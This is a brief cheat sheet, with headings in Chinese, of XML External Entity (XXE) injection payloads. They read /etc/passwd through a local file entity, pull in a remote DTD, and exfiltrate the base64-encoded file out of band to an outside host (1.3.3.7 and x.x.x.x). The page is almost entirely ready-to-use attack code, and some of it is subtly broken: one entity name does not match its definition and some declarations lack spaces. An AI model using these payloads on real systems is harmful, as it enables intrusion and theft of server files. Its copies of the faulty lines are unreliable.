# XML External Entity

DTD： 文档类型定义

基本操作：

```xml-dtd
<?xml version="1.0" ?>
<!DOCTYPE a [
    <!ENTITY content SYSTEM "file:///etc/passwd">]>
<value>&content;</value> 
```

外部引入：

```xml-dtd
<?xml version="1.0" ?>
<!DOCTYPE a [
    <!ENTITY % d SYSTEM "http://example.com/evil.dtd">
    %d;
]>
<value>&b;</value>
```

evil.dtd:

```xml-dtd
<!ENTITY d SYSTEM "file:///etc/passwd">
```

向外发送：

```xml-dtd
<?xml version="1.0" ?>
<!DOCTYPE r [
<!ELEMENT r ANY >
<!ENTITY % sp SYSTEM"http://1.3.3.7:8000/xxe.dtd">
%sp;
%param1;
]>

<r>&exfil;</r>
```

xxe.dtd

```xml-dtd
<!ENTITY % data SYSTEM"php://filter/convert.base64-encode/resource=/etc/passwd">
<!ENTITY % param1 "<!ENTITYexfil SYSTEM 'http://x.x.x.x:8090/?%data;'>">
```

